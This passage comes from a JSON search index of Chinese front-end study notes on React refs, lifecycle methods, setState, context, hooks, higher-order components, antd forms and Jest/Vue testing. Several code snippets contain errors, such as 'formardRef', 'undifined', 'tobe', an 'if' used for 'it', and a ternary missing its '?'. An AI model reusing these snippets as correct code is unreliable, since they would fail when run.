<p>\u5b9e\u9645\u9879\u76ee\u53ef\u80fd\u4e09\u79cd\u65b9\u6cd5\u90fd\u4f7f\u7528\uff08\u6709\u65e7\u4ee3\u7801\uff09\u6240\u4ee5\u4e09\u4e2a\u90fd\u8981\u4f1a\u7528\u3002</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#ref_1","title":"\u8f6c\u53d1REF","text":"<p>\u7c7b\u7ec4\u4ef6\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528REF\uff0c\u51fd\u6570\u7ec4\u4ef6\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\uff0c\u9700\u8981\u901a\u8fc7\u8f6c\u6362REF\u8f6c\u53d1\u8bbe\u7f6eREF\u3002</p> <pre><code>// \u51fd\u6570\u7ec4\u4ef6\u9700\u8981\u901a\u8fc7REF\u8f6c\u53d1\u540e\u83b7\u53d6\nconst NewComponent = React.formardRef(FunctionComponent);\n// render &lt;NewComponent ...props ref={this.newRef}&gt;\n\nfunction FunctionComponent(props, ref) {\n  return (\n    &lt;input ref={ref}/ type='text'&gt;\n  );\n}\n</code></pre> <p>\u5728HOC\u9ad8\u9636\u51fd\u6570\u4e2d\u8f6c\u53d1REF\uff1a\u5305\u88f9\u7ec4\u4ef6\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u5b50\u7ec4\u4ef6\u7684REF\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528 forwardRef \u6765\u8f6c\u53d1\u4e00\u4e0b\uff0c\u628a\u5185\u90e8\u7684REF\u8f6c\u53d1\u5230\u5305\u88f9\u5c42\u5916\u90e8\u7684\u7ec4\u4ef6\u3002\u4f7f\u7528\u9ad8\u9636\u51fd\u6570\u65f6\uff0c\u8bbe\u7f6e\u4e00\u4e2aREF\uff0cthis.inputRef.current \u83b7\u53d6\u5b50\u7ec4\u4ef6\u7684 ref\u3002</p> <pre><code>const hoc = WrapComponent =&gt; {\n  React.forwardRef((props, ref) =&gt; {\n    return (\n      &lt;div&gt;\n        &lt;WrapComponent {...props} innerRef={ref}/&gt;\n      &lt;/div&gt;\n    );\n  });\n}\n</code></pre> <p>\u5728 HOOK \u4e2d\u7684\u4f7f\u7528</p> <pre><code>function Input(props) {\n  const inpurRef = useRef(null);\n  // inputRef.current.value \u4f7f\u7528\n  return (\n    &lt;input type=\"text\" ref={inputRef}/&gt;\n  );\n}\n</code></pre> <p>\u603b\u7ed3\uff1a\u4e09\u79cd\u521b\u5efa\u65b9\u5f0f\u3001\u4e24\u79cd\u8f6c\u53d1REF\u7684\u60c5\u51b5\u3001\u4e00\u4e2a\u5728HOOK\u4e2d\u4f7f\u7528\u60c5\u51b5\uff08useRef\uff09\uff08\u8bb0\u5fc6 321\uff09</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#3","title":"3\u3001\u751f\u547d\u5468\u671f\u51fd\u6570","text":""},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#_1","title":"\u751f\u547d\u5468\u671f\u51fd\u6570\u9636\u6bb5","text":"<p>\u7ec4\u4ef6\u6302\u8f7d\u3001\u66f4\u65b0\u3001\u5378\u8f7d\u9636\u6bb5\u3002</p> <p>\u6302\u8f7d\u9636\u6bb5\uff1aconstructor \u6784\u9020\u5668\u3001componentWillMount\uff08\u8fc7\u65f6\u4e86\uff0c\u4e0d\u4f7f\u7528\uff09\u3001componentDidMount\uff08\u53d1\u51fa\u8bf7\u6c42\uff0c\u7ed1\u5b9a\u4e8b\u4ef6\uff0c\u83b7\u53d6DOM\u8282\u70b9\u5c3a\u5bf8\uff09</p> <p>\u66f4\u65b0\u9636\u6bb5\uff1ashouldComponentUpdate\u3001componentWillUpdate\u3001componentDidUpdate\u3001getDrivedStateFromProps\u3001componentWillReceiveProps(\u8fc7\u65f6\u4e86\uff0c\u4e0d\u4f7f\u7528) \u907f\u514d\u5728\u5176\u4e2dsetState</p> <p>\u5378\u8f7d\u9636\u6bb5\uff1acomponentWillUnmount\uff08\u89e3\u7ed1\u4e8b\u4ef6\uff0c\u5220\u9664\u5b9a\u65f6\u5668\u7b49\uff09</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#_2","title":"\u65b0\u589e\u548c\u5220\u9664\u7684\u751f\u547d\u5468\u671f","text":"<p>1\u3001componentWillMount \u5728\u670d\u52a1\u7aef\u5904\u7406\u8bf7\u6c42\uff0c\u5927\u89c4\u6a21\u5e76\u53d1\u8bf7\u6c42\u4e0d\u5229\u4e8e\u670d\u52a1\u5668\uff0c\u51cf\u5c11\u4f7f\u7528\uff1b</p> <p>2\u3001componentWillReceiveProps \u907f\u514d\u4f7f\u7528\uff0c\u6539\u6210 static getDerivedStateFromProps(nextProps, prevState) \u5bf9\u6bd4\u524d\u540e\u7684\u4e0d\u540c\uff0c\u7136\u540e\u66f4\u65b0state\uff08\u540c\u65f6\u589e\u52a0\u4e00\u4e2astate\uff09</p> <pre><code>static getDerivedStateFromProps(props, state) {\n  const { count } = this.state;\n  return count &gt; 5 { count: 0 } : null;\n}\n// \u8fd9\u662f\u4e00\u4e2a\u9759\u6001\u51fd\u6570\uff0c\u7528\u4e8e\u66ff\u4ee3componentWillReceiveProps\n// \u5177\u4f53\u7684\u5b9e\u73b0\u539f\u7406\uff08fiber\u5185\u90e8\uff09\u5982\u679c\u4f20\u5165\u4e86\u8fd9\u4e2a\u51fd\u6570\uff0c\u5c31\u4eceProps\u4e2d\u751f\u6210state\u72b6\u6001\n// \u7136\u540e\u5c06\u72b6\u6001\u5b58\u50a8\u5728\u5b9e\u4f8b\u4e2d\nconst getDerivedStateFromProps = ctor.getDerivedStateFromProps;\n\nif (typeof getDerivedStateFromProps === 'function') {\n  applyDerivedStateFromProps(\n    workInProgress,\n    ctor,\n    getDerivedStateFromProps,\n    newProps,\n  );\n  instance.state = workInProgress.memoizedState;\n}\n\n// \u4f7f\u7528TS\u8fdb\u884c\u53c2\u6570\u7c7b\u578b\u9a8c\u8bc1\nfunction applyDerivedStateFromProps(\n     workInProgress: Fiber,\n   ctor: any,\n   getDerivedStateFromProps: (props: any, state: any) =&gt; any,\n   nextProps: any\n) {\n  const prevState = workInProgress.memoizedState;\n  const memoizedState = partialState === null || partialState === undifined ? prevState : Object.assign({}, prevState, partialState);\n  // \u5982\u679c\u66f4\u65b0\u540e\u7684\u72b6\u6001\u4e0d\u662f\u7a7a\uff0c\u90a3\u4e48\u4f7f\u7528\u65b0\u7684state\u5408\u5e76\u539f\u59cb\u7684state\n  workInProgress.memoizedState = memoizedState;\n}\n</code></pre> <p>3\u3001componentWillUpdate \u8fd9\u4e2a\u5728\u7ec4\u4ef6\u66f4\u65b0\u524d\u6267\u884c\uff0c\u907f\u514d\u4f7f\u7528\u3002\u4f7f\u7528 getSnapshotBeforeUpdate \u4ee3\u66ff\u3002</p> <p>\u5185\u90e8\u5224\u65ad\uff1a\u5982\u679c\u6709 getDirevedStateFromProps \u6216\u8005 getSnapshotBeforeUpdate \u5c31\u6709\u65b0\u7684\u751f\u547d\u5468\u671f\u51fd\u6570\u3002\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e0d\u80fd\u548c\u5373\u5c06\u5e9f\u5f03\u7684\u65e7\u51fd\u6570\u540c\u65f6\u4f7f\u7528\u3002</p> <pre><code>const snapshot = instance.getSnapshotBeforeUpdate(\n    finishedWork.elementType === finishedWork.type\n    ? prevProps\n    : resolveDefaultProps(finishedWork.type, prevProps),\n  prevState\n);\ninstance.__reactInternalSnapshotBeforeUpdate = snapshot;\n</code></pre> <p>4\u3001\u5176\u4ed6</p> <p>\u7ec4\u4ef6\u4ec0\u4e48\u65f6\u5019\u4f1a\u66f4\u65b0\uff1fProps \u53d8\u5316\u3001state \u53d8\u5316\uff08setState\uff09forceUpdate \u89e6\u53d1</p> <p>\u7ec4\u4ef6\u5378\u8f7d\uff1f\u53ea\u6267\u884c\u4e00\u6b21 componentWillUnmount</p> <pre><code>const instance = current.stateNode;\nif (typeof instance.componentWillUnmount === 'function') {\n  safelyCallComponentWillUnmount(current, instance);\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#4","title":"4\u3001\u4e8b\u4ef6\u7cfb\u7edf","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u8bb2\u5408\u6210\u4e8b\u4ef6\u548c\u539f\u751f\u4e8b\u4ef6\u7684\u5173\u7cfb\uff1b\u5408\u6210\u4e8b\u4ef6\u5bf9\u5e94\u7684\u4e00\u4e2a\u8868\u3002\u5408\u6210\u4e8b\u4ef6\u548c\u5f02\u6b65\u64cd\u4f5c\u7684\u6267\u884c\u8fc7\u7a0b\u3002</p> <pre><code>// reactDOMComponent\nfunction setInitialDOMProperties (\n    tag: string,\n  domElement: Element,\n  rootContainerElement: Element | Document,\n  nextProps: Object,\n  isCustomComponentTag: boolean,\n): void {\n   for (const propKey in nextProps) {\n     // \u6392\u9664\u4e86\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\n     if (!nextProps.hasOwnProperty(propKey)) {\n       continue;\n     }\n     const nextProp = nextProps[propKey];\n     // nextProp \u6839\u636e\u8fd9\u4e2a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u7136\u540e\u5206\u522b\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\n   }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#5setstate","title":"5\u3001setState\u63cf\u8ff0","text":"<p>setState \u53ef\u4ee5\u4f20\u4e24\u4e2a\u53c2\u6570\uff1a\u7b2c\u4e00\u4e2a\u662f Object \u6216\u8005 function\uff0c\u7136\u540e\u83b7\u53d6\u4e00\u4e2a\u65b0\u7684\u72b6\u6001\uff0c\u7136\u540e\u548c\u539f\u6765\u7684\u72b6\u6001\u5408\u5e76\u540e\u66f4\u65b0\u754c\u9762\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u66f4\u65b0\u754c\u9762\u540e\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>setState \u901a\u5e38\u662f\u5f02\u6b65\u6267\u884c\u7684\u3002\u5982\u679c\u5728 setTimeout\u5185\u90e8\uff0c\u90a3\u4e48\u5c31\u662f\u540c\u6b65\u6267\u884c\u7684\u3002</p> <p>\u5177\u4f53\u6267\u884c\u8fc7\u7a0b</p> <pre><code>Component.prototype.setState = function(partialState, callback) {\n  invariant(\n    typeof partialState === 'object' ||\n        typeof partialState === 'function' ||\n        partialState == null,\n    'setState(...): \u63cf\u8ff0\u6587\u5b57',\n  );\n  // \u8fdb\u5165\u961f\u5217\n  this.updater.enqueueSetState(this, partialState, callback, 'setState');\n};\n\n// \u5177\u4f53\u6267\u884c\nenqueueUpdate(fiber, update);\nscheduleUpdateOnFiver(fiber, expirationTime);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#6reactredux","title":"6\u3001react\u7ec4\u4ef6\u901a\u4fe1\uff08redux\uff09","text":"<p>\u8de8\u5c42\u7ea7\u901a\u4fe1\uff1acontext \u8de8\u8d8a\u591a\u4e2a\u5c42\u7ea7\u901a\u4fe1\uff08redux\uff09</p> <p>React-Router location \u53ef\u4ee5\u4f7f\u7528 context \u4e0a\u4e0b\u6587\u4f20\u53c2</p> <ul> <li>Context \u7b80\u4ecb</li> </ul> <p>React\u4e2d\uff0c\u4f7f\u7528 context \u5b9e\u73b0\u7ec4\u4ef6\u8de8\u5c42\u7ea7\u4f20\u503c</p> <pre><code>React.createContext();\n\nReact.Provider\n\nReact.contextType\n\nReact.Consumer\n</code></pre> <p>\u57fa\u672c\u4f7f\u7528</p> <pre><code>import React, {Component,useContext} from 'react';\n\nconst MyContext = React.createContext({});\n\nclass ClassChild extends Component {\n  static contextType = MyContext;\n    render() {\n    const {color} = this.context;\n    return (\n        &lt;button&gt;\n        style={{color: color}}\n      &lt;/button&gt;\n    );\n  }\n}\n</code></pre> <p>Context \u53ef\u80fd\u4f1a\u91cd\u590d\u6e32\u67d3\uff1a\u5f53Provider\u7236\u7ec4\u4ef6\u8fdb\u884c\u91cd\u91cd\u590d\u6e32\u67d3\u65f6\uff0c\u53ef\u80fd\u5728consumerszizujian \u4e2d\u91cd\u590d\u6e32\u67d3-\u4f20\u53c2\u5982\u679c\u662f\u5bf9\u8c61\uff0c\u90a3\u4e48\u6bcf\u6b21\u5bf9\u8c61\u66f4\u65b0\u90fd\u4f1a\u91cd\u590d\u6e32\u67d3\u5b50\u7ec4\u4ef6\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u4e0d\u4f20\u9012\u5bf9\u8c61\uff0c\u4f20\u9012\u4e00\u4e2a\u5b57\u7b26\u4e32\u7b49\uff1b\u6216\u8005\u628a\u72b6\u6001\u63d0\u5347\u5230\u7236\u8282\u70b9\u7684state\u4e2d</p> <pre><code>this.state = {\n  value: {key: 'test'}\n};\n\nrender() {\n  return (\n    &lt;Provider value={this.state.value}&gt;\n      &lt;Toolbar/&gt;\n    &lt;/Provider&gt;\n  );\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#7","title":"7\u3001\u51fd\u6570\u7ec4\u4ef6\u548c\u7c7b\u7ec4\u4ef6\u5982\u4f55\u9009\u62e9","text":"<p>\u6ca1\u6709HOOK\u7684\u60c5\u51b5\uff1a\u51fd\u6570\u7ec4\u4ef6\u4e3b\u8981\u5c55\u793a\u529f\u80fd\uff0c\u4e0d\u652f\u6301\u590d\u6742\u6570\u636e\u4ea4\u4e92\uff1b\u7c7b\u7ec4\u4ef6\u4e2d\u652f\u6301state\u8bbe\u7f6e\u548c\u5176\u4ed6\u6570\u636e\u4ea4\u4e92\u7b49\uff08\u65e0\u72b6\u6001\u3001\u65e0\u526f\u4f5c\u7528\uff09\u3002</p> <p>\u7c7b\u7ec4\u4ef6\u7f3a\u70b9\uff1a\u7ec4\u4ef6\u4e4b\u95f4\u590d\u7528\u72b6\u6001\u5f88\u96be\uff1b\u590d\u6742\u7ec4\u4ef6\u7ef4\u62a4\u8f83\u96be\uff1bthis\u6307\u5411\u95ee\u9898\u3002\u5982\u679c\u4e00\u4e2a\u7ec4\u4ef6\u6709\u4e0a\u9762\u7684\u7f3a\u70b9\uff0c\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u7ec4\u4ef6</p> <p>\u6709HOOK\u7684\u60c5\u51b5\uff1a\u51fd\u6570\u7ec4\u4ef6\u53ef\u4ee5\u5b58\u50a8\u6539\u53d8\u72b6\u6001\uff08useState useReducer\uff09\u53ef\u4ee5\u6267\u884c\u526f\u4f5c\u7528\u590d\u7528\u903b\u8f91\uff08useEffect, useLayoutEffect, \u81ea\u5b9a\u4e49Hook\u7b49\uff09</p> <pre><code>// \u81ea\u5b9a\u4e49hook-\u5fc5\u987b\u4ee5use\u5f00\u5934\n// \u5728\u51fd\u6570\u4e2d\uff0c\u4e0d\u9700\u8981\u5199render\uff0c\u76f4\u63a5\u4f7f\u7528State\u4fdd\u5b58\u72b6\u6001\nfunction useClock() {\n  const [date, setDate] = useState(new Date());\n  useEffect(() =&gt; {\n    // didMount \u9636\u6bb5\u6267\u884c\n    const timer = setInterval(() =&gt; {\n      setDate(newDate());\n    }, 1000);\n    // UNmount\u9636\u6bb5\uff0c\u6e05\u9664\u5b9a\u65f6\u5668\n    return () =&gt; clearInterval(timer);\n  }, []);\n  return date;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#8react","title":"8\u3001react\u6027\u80fd\u4f18\u5316","text":"<p>\u6574\u7406\u601d\u8def\uff1a\u51cf\u5c11JS\u8fd0\u7b97\uff0c\u51cf\u5c11\u754c\u9762\u6e32\u67d3\uff0c\u51cf\u5c11HTTP\u8bf7\u6c42</p> <ul> <li>\u51cf\u5c11JS\u8fd0\u7b97\uff1a\u4f18\u5316\u7b97\u6cd5\uff0c\u51cf\u5c11\u65f6\u95f4\u590d\u6742\u5ea6</li> <li>\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u6e32\u67d3\uff1ashouldComponentUpdate\u3001PureComponent\u3001React.memo\uff08\u51fd\u6570\u7ec4\u4ef6\u4e2d\u5b9e\u73b0PureComponent\u7684\u529f\u80fd\uff09 </li> <li>\u6570\u636e\u7f13\u5b58\uff1a\u539f\u751fJS\u4e2d\u4f7f\u7528cache\u7f13\u5b58\u6570\u636e\uff1bHOOK\u4e2d\u4f7f\u7528 useMemo useCallback \u7f13\u5b58\u51fd\u6570</li> </ul> <pre><code>function updateMemo&lt;T&gt;(\n    nextCreate: () =&gt; T,\n  deps: Array&lt;mixed&gt; | void | null,\n): T {\n  const hook = updateWorkInProgressHook();\n  const nextDeps = deps === undefined ? null : deps;\n  const prevState = hook.memorizedState;\n  //...\n  const nextValue = nextCtrete();\n  hook.memoizedState = [nextValue, nextDeps];\n  return nextValue;\n}\n</code></pre> <ul> <li> <p>\u51fd\u6570\u5bf9\u8c61\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\u5185\u8054\u5f62\u5f0f\uff1a\u6bcf\u6b21\u6267\u884c\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\uff0c\u5b50\u7ec4\u4ef6\u4e2d\u5bf9\u6bd4\u4e0d\u540c\uff0c\u4f1a\u91cd\u65b0\u6e32\u67d3\u5b50\u7ec4\u4ef6\u3002</p> </li> <li> <p>\u4e0d\u8981\u6ee5\u7528 props context(redux\u4f20\u53c2)</p> </li> <li>\u957f\u9875\u9762\u5927\u56fe\u7247\u61d2\u52a0\u8f7d</li> <li>\u51cf\u5c11\u8bf7\u6c42\u7b49</li> </ul>"},{"location":"ebook-kaikeba-frontend/10-React%E7%BB%84%E4%BB%B6%E5%8C%96/","title":"\u5f00\u8bfe\u5427 01 React \u7ec4\u4ef6\u5316","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 3282  \u9605\u8bfb7\u5206\u949f</p> <p>2021-10</p> <p>\u89c6\u9891\u770b\u5230 41\uff1a04 \u540e\u7eed\u89c6\u9891\u6559\u7a0b\u6ca1\u6709\u770b</p> <p>\u8fd9\u4e2a\u8bfe\u7a0b\u9700\u8981\u6709\u4e00\u5b9a React \u57fa\u7840\uff08create-react-app\uff09</p>"},{"location":"ebook-kaikeba-frontend/10-React%E7%BB%84%E4%BB%B6%E5%8C%96/#hoc","title":"\u9ad8\u9636\u7ec4\u4ef6 HOC","text":"<p>\u9ad8\u9636\u7ec4\u4ef6\u5f88\u9ebb\u70e6\uff0c\u4e3a\u4ec0\u4e48\u4f7f\u7528\u5462\uff1f\u4e3a\u4e86\u63d0\u9ad8\u7ec4\u4ef6\u7684\u590d\u7528\u6027\uff1b</p> <p>\u4e0b\u9762\u662fHOC\u7684\u5e38\u89c1\u5199\u6cd5</p> <pre><code>function Child(props) {\n  return &lt;div&gt;test&lt;/div&gt;\n}\n\n// \u9ad8\u9636\u7ec4\u4ef6\uff08\u53c2\u6570\u662f\u4e00\u4e2a\u7ec4\u4ef6\uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7ec4\u4ef6\uff09\nconst foo = Component =&gt; props =&gt; {\n  return (\n    &lt;div&gt;\n      &lt;Component {...props} /&gt;\n    &lt;/div&gt;\n  );\n}\n\nconst Foo = foo();\n\nexport default class HocPage extends React.Component {\n  render() {\n    return (\n      &lt;div&gt;\n        &lt;Foo&gt;&lt;/Foo&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n</code></pre> <p>\u5728 ES7 \u4e2d\uff0c\u53ef\u4ee5\u7b80\u5316\uff1a\u4f7f\u7528\u88c5\u9970\u5668\u6a21\u5f0f\u7b80\u5316</p> <pre><code>npm install -D @babel/plugin-proposal-decorators\n</code></pre> <p>\u589e\u52a0\u914d\u7f6e config-overrides.js</p> <pre><code>const { addDecoratorsLegacy } = require(\"customize-cra\");\n\nmodule.exports = override(\n    ...,\n  addDecoratorsLegacy()\n);\n</code></pre> <p>config-overrides.js \u7684\u5168\u90e8\u914d\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>const { \n  override,\n  fixBabelImports,\n  addDecoratorsLegacy\n} = require(\"customize-cra\");\n\nmodule.exports = override(\n    fixBabelImports(\"import\", {\n    libraryName: \"antd\",\n    libraryDirectory: \"es\",\n    style: \"css\"\n  }),\n  addDecoratorsLegacy()\n);\n</code></pre> <p>\u5728\u7ec4\u4ef6\u4e2d</p> <pre><code>@foo\nclass Child extends React.Component {\n  render() {\n    return &lt;div&gt;test&lt;/div&gt;;\n  }\n}\n\n@foo\n@foo1\n@foo2\nclass Child extends React.Component {\n  render() {\n    return &lt;div&gt;test&lt;/div&gt;;\n  }\n}\n// \u8fd9\u91cc\u8868\u793a\u4f7f\u7528\u591a\u4e2a\u9ad8\u9636\u7ec4\u4ef6\u5305\u88f9\u4e24\u6b21\u7684Child\n\n\n// \u9ad8\u9636\u7ec4\u4ef6\uff08\u53c2\u6570\u662f\u4e00\u4e2a\u7ec4\u4ef6\uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7ec4\u4ef6\uff09\nconst foo = Component =&gt; props =&gt; {\n  return (\n    &lt;div&gt;\n      &lt;Component {...props} /&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>HOC \u6ce8\u610f\u4e8b\u9879\uff1a\u4e0d\u8981\u5728render\u9636\u6bb5\u4f7f\u7528HOC\uff1b</p>"},{"location":"ebook-kaikeba-frontend/10-React%E7%BB%84%E4%BB%B6%E5%8C%96/#ant-design","title":"\u7ec4\u4ef6\u5316\uff08ant-design\uff09","text":"<p>\u5728 ant-design \u4e2d\u4f7f\u7528\u9ad8\u9636\u7ec4\u4ef6\u4f18\u5316\u4ee3\u7801</p> <p>\u4f8b\u5982\u5728\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u4f20\u7edf\u7684\u505a\u6cd5\u662f\u7ed9\u6bcf\u4e00\u4e2a\u8868\u5355\u9879\u90fd\u7ed1\u5b9a\u4e00\u4e2a state \u548c\u56de\u8c03\u51fd\u6570\uff0c\u7136\u540e\u63d0\u4ea4\u65f6\u83b7\u53d6\u4e0d\u540c\u7684state\u3002\u5982\u679c\u8868\u5355\u9879\u5f88\u591a\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u91cf\u4f1a\u5f88\u591a\uff0c\u4e0d\u597d\u7ef4\u62a4\u3002\u4f7f\u7528\u5b98\u65b9\u63d0\u4f9b\u7684\u9ad8\u9636\u7ec4\u4ef6\u3002</p> <pre><code>import {Form, Imput, Icon, Button} from 'antd';\n\n@Form.create({})\nclass FormPage extends Component {\n\n  submit = () =&gt; {\n    console.log('submit');\n    console.log(this.props); // \u9ad8\u9636\u7ec4\u4ef6\u4e2d\u4f20\u9012\u7684\u51fd\u6570\n    const { getFieldsValue, getFieldValue, validateFields } = this.props.form;\n    getFieldsValue();\n    getFieldValue('name');\n    validateFields((err, values) =&gt; {\n      if (err) {\n        console.log(err);\n      } else {\n        console.log('success');\n        // submit\n      }\n    });\n  }\n\n  render() {\n    const { getFieldDecorator } = this.props.form;\n    return(\n      &lt;Form&gt;\n        &lt;Form.Item&gt;\n          {getFieldDecorator('name', {rules: [nameRules]})(\n            &lt;Input placehoulder=\"please input name\" /&gt;\n          )}\n        &lt;/Form.Item&gt;\n        &lt;Form.Item&gt;\n            &lt;Input type=\"password\" placehoulder=\"please input pwd\" /&gt;\n        &lt;/Form.Item&gt;\n      &lt;/Form&gt;\n    );\n  }\n}\n</code></pre> <p>\u5177\u4f53\u7684\u8bf4\u660e\u5728 ant-design \u4e2d\u8be6\u7ec6\u8bf4\u660e</p> <p>getFieldDecorator \u548c\u8868\u5355\u8fdb\u884c\u53cc\u5411\u7ed1\u5b9a</p> <p>getFieldsValue \u83b7\u53d6\u5168\u90e8\u8868\u5355\u7684\u503c</p> <p>getFieldValue \u83b7\u53d6\u67d0\u4e2a\u8868\u5355\u7684\u503c</p> <p>validateFields \u8868\u5355\u8f93\u5165\u9a8c\u8bc1\uff08\u6b63\u5219\uff09</p> <p>\u672a\u770b\uff1a\u4f20\u9001\u95e8\u5b9e\u73b0</p>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/","title":"\u81ea\u52a8\u5316\u6d4b\u8bd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5546  \u9605\u8bfb12\u5206\u949f</p> <p>2021-10</p> <p>\u5f00\u8bfe\u5427\u7684\u8bfe\u7a0b\uff0c\u6574\u4f53\u5e9f\u8bdd\u6bd4\u8f83\u591a\uff0c\u6761\u7406\u6027\u4e0d\u5f3a</p>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/#expect","title":"\u624b\u5199 expect \u6d4b\u8bd5\u51fd\u6570","text":"<pre><code>// \u81ea\u5b9a\u4e49\u5355\u5143\u6d4b\u8bd5\u51fd\u6570\nfunction test(description, fn) {\n  try {\n    fn();\n    console.log(description, '\u901a\u8fc7\u6d4b\u8bd5');\n  } catch (e) {\n    console.error(e);\n    console.log(description, '\u6d4b\u8bd5\u5931\u8d25');\n  }\n}\n\nfunction expect(ret) {\n  return {\n    toBe(arg) {\n      if (ret !== arg) {\n        throw Error(`\u6d4b\u8bd5\u4e0d\u7b26\u5408\uff0c\u9884\u671f\u662f${arg}\uff0c\u5b9e\u9645\u662f${ret}`);\n      }\n    }\n  };\n}\n\ntest('test add fn', () =&gt; {\n  expect(add(1, 2)).toBe(2);\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/#vue","title":"VUE \u4e2d\u7684\u6d4b\u8bd5","text":"<p>Vue \u4e2d\u7684\u7ec4\u4ef6\u53ef\u4ee5\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528\u5b98\u65b9\u7684\u6d4b\u8bd5\u7ec4\u4ef6</p> <pre><code>// Vue Test Utils\nimport { shallowMount } from '@vue/test-utils';\nimport MyCom from './MyComponent.vue';\n\n// \u6302\u8f7d\u7ec4\u4ef6\nconst wrapper = shallowMount(MyCom);\n\ndescribe(\"test component\", () =&gt; {\n\n  // \u5224\u65ad\u7ec4\u4ef6\u7684\u751f\u547d\u5468\u671f\u51fd\u6570\n  it('create fn', () =&gt; {\n    expect(typeof MyCom.created).tobe('function');\n  });\n\n  // \u5224\u65ad\u51fd\u6570\u7684\u9ed8\u8ba4\u503c\n  it('test fn result', () =&gt; {\n    expect(typeof MyCom.data).toBe('function');\n    const defaultData = MyComponent.data();\n    expect(defaultData.message).toBe('hello');\n  });\n\n  if('updates the rendered message', async () =&gt; {\n    const wrapper = shallowMount(MyCom);\n    wrapper.setData({ message: 'foo' });\n    await wrapper.vm.$nextTick();\n    expect(wrapper.text()).toBe('foo');\n  });\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/#_2","title":"\u5177\u4f53\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u751f\u547d\u5468\u671f\u51fd\u6570\u53ef\u4ee5\u5728\u9ed8\u8ba4\u73af\u5883\u4e0b\u76f4\u63a5\u6d4b\u8bd5\uff08\u4e0d\u4f9d\u8d56\u4e8e\u6d4f\u89c8\u5668\u6216\u8005node\u73af\u5883\uff09\uff1bDOM \u70b9\u51fb\u4e8b\u4ef6\u9700\u8981\u4f9d\u8d56\u7b2c\u4e09\u65b9\u5e93\u5b9e\u73b0</p> <pre><code>&lt;template&gt;\n    &lt;div id=\"app\"&gt;\n    &lt;h1&gt;{{message}}&lt;/h1&gt;\n    &lt;button @click=\"update\"&gt;&lt;/button&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  name: 'App',\n  data() {\n    return {\n      message: 'init',\n    }\n  },\n  created() {\n    this.message = 'created'\n  },\n  methods: {\n    update() {\n      this.message = 'update'\n    }\n  }\n}\n&lt;/script&gt;\n\n&lt;style&gt;\n&lt;/style&gt;\n</code></pre> <p>\u5728 package.json \u4e2d\u914d\u7f6e jest</p> <pre><code>{\n  \"jest\": {\n    \"preset\": \"@vue/cli-plugin-unit-jest\",\n    \"collectCoverage\": true,\n    \"collectCoverageFrom\": [\"src/**/*.{js,vue}\"]\n  }\n}\n</code></pre> <p>\u6d4b\u8bd5\u6587\u4ef6 app.spec.js</p> <pre><code>import App from '../../src/App.vue';\nimport { mount } from '@vue/test-utils';\n\ndescribe('test app', () =&gt; {\n  it('init state', () =&gt; {\n    expect(typeof App.created).toBe('function');\n  });\n\n  it('component data', () =&gt; {\n    let defaultData = App.data();\n    expect(defaultData.message).toBe('init');\n  });\n\n  it('test click btn', () =&gt; {\n    const wrapper = mount(App);\n    wrapper.find('button').trigger('click');\n    expect(wrapper.vm.message).toBe('update');\n    // dom \u66f4\u65b0\u9700\u8981\u65f6\u95f4\uff0c\u6240\u4ee5\u5728 nextTick \u6d4b\u8bd5\n    Vue.nextTick(() =&gt; {\n      expect(wrapper.find('h1').html()).toBe('&lt;h1&gt;update&lt;/h1&gt;')\n    });\n  });\n\n  // \u6216\u8005\u5199\u6210 es6 